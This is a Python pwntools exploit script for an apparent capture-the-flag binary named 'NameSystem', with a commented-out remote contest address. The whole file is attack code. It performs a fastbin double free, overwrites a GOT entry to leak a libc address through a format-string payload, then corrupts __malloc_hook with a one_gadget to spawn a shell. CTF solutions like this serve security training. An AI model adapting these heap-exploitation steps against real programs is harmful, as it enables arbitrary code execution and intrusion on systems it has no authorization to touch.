#!/usr/bin/env python
# -*- coding=utf8 -*-
"""
# Author: le3d1ng
# Created Time : 2019年11月09日 星期六 16时10分50秒
# File Name: exp.py
# Description:
"""
from pwn import *
context.log_level = 'debug'
#context.terminal = ['terminator' , '-f' , '-x' , 'sh' , '-c']

io = process("./NameSystem")
#io = remote("183.129.189.62",20605)
s = lambda a: io.send(str(a))
sa = lambda a, b: io.sendafter(str(a), str(b))
st = lambda a, b: io.sendthen(str(a), str(b))
sl = lambda a: io.sendline(str(a))
sla = lambda a, b: io.sendlineafter(str(a), str(b))
slt = lambda a, b: io.sendlinethen(str(a), str(b))
r = lambda a=4096: io.recv(a)
rl = lambda: io.recvline()
ru = lambda a: io.recvuntil(str(a))
irt = lambda: io.interactive()
def debug():
    gdb.attach(io)
    io.interactive()




def add(l,c):
    sla("choice :\n",1)
    sla("e Size:",l)
    sla("Name:",c)

def dele(idx):
    sla("choice :\n",3)
    sla("nt to delete:",idx)



for x in range(0,15):
    add(0x40,x)
add(0x50,"%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx")
add(0x50,16)
add(0x50,17)
add(0x50,18)
add(0x50,19)
#debug()

dele(18)
dele(19)
dele(17)
dele(17)
#debug()
for x in range(3):
    add(0x60,x)
dele(18)
dele(19)
dele(17)
dele(17)
for x in range(10):
    dele(1)

fc1 = 0x601ffa
add(0x50,p64(fc1))
add(0x50,p64(fc1))
add(0x50,'AAA')
add(0x50,'\x00'*0xe+p64(0x4006D0)+p64(0x4006D0))



sla("r choice :",3)
sla(" to delete:",5)
r = io.recv().split(",")
libcbase = int("0x"+r[12],16)-0x20830
success("libc: "+hex(libcbase))

libc= ELF("/lib/x86_64-linux-gnu/libc.so.6")
mallochookaddr = libcbase + libc.symbols['__malloc_hook']
libcrealloc = libcbase + libc.symbols['__libc_realloc']
fakechunk = mallochookaddr - 0x23
success('mallochook ' +hex(mallochookaddr))
onegad  = libcbase + 0xf1147#0xf02a4#0xf1147

def add2(s,c):
    sl(1)
    sla("e Size:",s)
    sla("Name:",c)
add2(0x60,p64(fakechunk))
add2(0x60,'aaa')
add2(0x60,'aaa')
gdb.attach(io, 'b* 0x400BCB')

add2(0x60,'b'*(19-8)+p64(onegad) + p64(libcrealloc+0x14))

irt()
exit()